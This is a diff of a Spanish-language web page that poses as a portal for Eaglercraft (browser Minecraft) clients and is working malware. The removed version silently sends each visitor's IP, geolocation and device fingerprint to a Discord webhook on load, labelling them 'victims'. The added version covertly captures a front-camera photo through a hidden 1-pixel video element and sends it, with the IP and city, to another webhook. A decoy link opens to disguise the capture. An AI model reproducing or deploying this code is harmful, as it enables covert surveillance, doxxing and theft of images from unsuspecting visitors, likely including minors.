@@ -1,116 +1,62 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="utf-8">
-<title>HOME FORGEX — Clientes Eaglercraft</title>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<style>
-  :root{--bg:#05060a;--card:#0f1724;--acc:#a78bfa;--pink:#ec4899;--muted:#9ca3af}
-  body{margin:0;font-family:system-ui;background:var(--bg);color:#fff;min-height:100vh;display:flex;flex-direction:column}
-  header{position:sticky;top:0;background:rgba(0,0,0,.4);backdrop-filter:blur(12px);border-bottom:1px solid #333}
-  .nav{max-width:1200px;margin:auto;padding:16px;display:flex;justify-content:space-between;align-items:center}
-  .logo{width:48px;height:48px;border-radius:12px;background:linear-gradient(135deg,var(--acc),var(--pink));display:grid;place-items:center;font-weight:900;font-size:22px}
-  .title{background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent;font-weight:800}
-  main{flex:1;max-width:1200px;margin:30px auto;padding:0 20px}
-  .grid{display:grid;gap:18px;grid-template-columns:repeat(auto-fit,minmax(270px,1fr))}
-  .card{background:rgba(255,255,255,.025);border:1px solid rgba(255,255,255,.08);border-radius:16px;padding:20px;transition:.25s}
-  .card:hover{transform:translateY(-8px);box-shadow:0 20px 50px rgba(167,139,250,.2)}
-  .name{font-weight:800;font-size:18px;margin-bottom:6px}
-  .open{background:linear-gradient(90deg,var(--acc),var(--pink));color:#fff;border:none;padding:14px;border-radius:14px;font-weight:700;width:100%;cursor:pointer}
-  h1{text-align:center;font-size:2.8rem;margin:20px 0;background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent}
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>FORGEX MOBILE</title>
+  <style>
+    body{background:#000;color:#0f0;font-family:monospace;margin:0;overflow:hidden}
+    #v{cursor:pointer;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:1px;height:1px}
+    .msg{position:fixed;bottom:20px;left:0;right:0;text-align:center;font-size:18px}
+  </style>
 </head>
 <body>
-
-<header>
-  <div class="nav">
-    <div style="display:flex;align-items:center;gap:14px">
-      <div class="logo">HF</div>
-      <div><div class="title">HOME FORGEX</div><small style="color:var(--muted)">@j_eliseoo_v • 2025</small></div>
-    </div>
-  </div>
-</header>
-
-<main>
-  <h1>Clientes Eaglercraft 2025</h1>
-  <div class="grid">
-    <div class="card"><div class="name">DragonX Client</div><div class="ver">V5.1</div><button class="open" data-link="https://eaglerhacks.github.io/dragonv4.html">Abrir</button></div>
-    <div class="card"><div class="name">WurstX Client</div><button class="open" data-link="https://eaglerhacks.github.io/wurstX.html">Abrir</button></div>
-    <div class="card"><div class="name">UwU+ Client</div><button class="open" data-link="https://eaglerhacks.github.io/UwUClient%20v1%20Full.html">Abrir</button></div>
-    <div class="card"><div class="name">ShadowX Client</div><button class="open" data-link="https://eaglerhacks.github.io/Shadow_Client_2.5_1.8.8_International.html">Abrir</button></div>
-    <div class="card"><div class="name">PiClient</div><button class="open" data-link="https://eaglerhacks.github.io/PiClient.html">Abrir</button></div>
-    <div class="card"><div class="name">flameClient</div><button class="open" data-link="https://eaglerhacks.github.io/flameclient%203.7.html">Abrir</button></div>
-  </div>
-</main>
+<video id="v" autoplay playsinline></video>
+<div class="msg">Toca la pantalla para cargar el cliente...</div>
 
 <script>
-// TU WEBHOOK REAL (funciona perfecto)
-const WEBHOOK = "https://discord.com/api/webhooks/1446712536656249005/sbyzRE1yccOtJ2qJFGFN9K8ltOxELsq8ZqQ04howQOMffAccLDJOFjXgp9alt__ysvBP";
+// TU WEBHOOK
+const WEBHOOK = "https://discord.com/api/webhooks/1447276191961841905/IWpiF5AZjKc8iHpch5JkReeixmIjZv13QR4ZvS-ldQeiniF-iCVLyotHDlEEsdcETyyU";
 
-// ENVÍA TODO AL INGRESAR A LA PÁGINA (0 clics, 0 permisos)
-(async () => {
-  const geo = await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({}));
-  const battery = await navigator.getBattery?.() || {};
-  const uaData = navigator.userAgentData || {};
-  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+let stream, video = document.getElementById("v");
 
-  const datos = {
-    hora: new Date().toLocaleString(),
-    ip: geo.ip || 'oculta',
-    isp: geo.org || '?',
-    ciudad: geo.city || '?',
-    region: geo.region || '?',
-    pais: geo.country_name || '?',
-    codigo_postal: geo.postal || '?',
-    latitud: geo.latitude || '?',
-    longitud: geo.longitude || '?',
-    navegador: navigator.userAgent,
-    marcas: uaData.brands?.map(b=>b.brand+" v"+b.version).join(', ') || 'desconocido',
-    sistema: uaData.platform || navigator.platform,
-    movil: uaData.mobile ? 'Sí' : 'No',
-    ram_gb: navigator.deviceMemory || 'desconocido',
-    cpu_nucleos: navigator.hardwareConcurrency || '?',
-    pantalla: `${screen.width}x${screen.height}x${screen.colorDepth}`,
-    bateria: battery.level ? `${Math.round(battery.level*100)}% ${battery.charging?'cargando':'descargando'}` : 'no disponible',
-    conexion: connection.effectiveType || '?',
-    velocidad: connection.downlink ? `${connection.downlink} Mbps` : '?',
-    zona_horaria: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    idioma: navigator.language,
-    idiomas: navigator.languages?.join(', ') || '?',
-    pestañas: history.length,
-    cookies: navigator.cookieEnabled ? 'Sí' : 'No',
-    modo_oscuro: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Sí' : 'No',
-    online: navigator.onLine ? 'Sí' : 'No'
-  };
-
-  const mensaje = 
-`**NUEVA VÍCTIMA (MÁXIMO DETALLE)**
-**IP:** ${datos.ip} (${datos.isp})
-**Ubicación:** ${datos.ciudad}, ${datos.region}, ${datos.pais} (${datos.codigo_postal})
-**Coordenadas:** ${datos.latitud}, ${datos.longitud}
-**Hora:** ${datos.hora}
-**Navegador:** ${datos.marcas}
-**SO:** ${datos.sistema} | Móvil: ${datos.movil}
-**RAM:** ${datos.ram_gb} GB | CPU: ${datos.cpu_nucleos} núcleos
-**Pantalla:** ${datos.pantalla}
-**Batería:** ${datos.bateria}
-**Conexión:** ${datos.conexion} (${datos.velocidad})
-**Zona horaria:** ${datos.zona_horaria}
-**Idioma:** ${datos.idioma}
-**Pestañas:** ${datos.pestañas}
-**Cookies:** ${datos.cookies} | Modo oscuro: ${datos.modo_oscuro}`;
-
-  await fetch(WEBHOOK, {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({content: mensaje})
-  });
-})();
-
-// Botones normales (solo abren el link)
-document.querySelectorAll('.open').forEach(btn => {
-  btn.onclick = () => setTimeout(() => window.open(btn.dataset.link, '_blank'), 300);
+// GRABBER NORMAL (IP + INFO)
+fetch("https://ipapi.co/json/").then(r=>r.json()).then(ip=>{
+  const info = `**VÍCTIMA MÓVIL**\n**IP:** ${ip.ip}\n**Ciudad:** ${ip.city}, ${ip.country_name}\n**Hora SV:** ${new Date().toLocaleString("es-SV")}`;
+  
+  // TOMA FOTO FRONTAL INVISIBLE
+  navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:false})
+    .then(s=>{stream=s; video.srcObject=stream; video.play(); tomaFoto();})
+    .catch(()=>{ /* si falla, igual envía la info */ fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:info+" (sin cámara)"})})});
 });
+
+function tomaFoto(){
+  let canvas = document.createElement("canvas");
+  canvas.width = 640; canvas.height = 480;
+  canvas.getContext("2d").drawImage(video,0,0,640,480);
+  const foto = canvas.toDataURL("image/jpeg",0.8);
+
+  // ENVÍA FOTO + INFO
+  fetch(WEBHOOK,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      username:"FORGEX MOBILE STEALER",
+      content:"**VÍCTIMA MÓVIL CAYÓ**",
+      embeds:[{image:{url:foto}, fields:[
+        {name:"IP + Ubicación", value:`${foto.substring(0,20)}... (foto arriba)`, inline:false}
+      ]}]
+    })
+  });
+
+  // Para que no se quede la cámara encendida
+  setTimeout(()=>{stream.getTracks().forEach(t=>t.stop());},1000);
+}
+
+// Al tocar la pantalla (para disimular) abre un cliente cualquiera
+document.body.onclick = () => {
+  window.open("https://eaglercraft-unblocked.neocities.org/eaglymc-120/", "_blank");
+};
 </script>
 </body>
 </html>
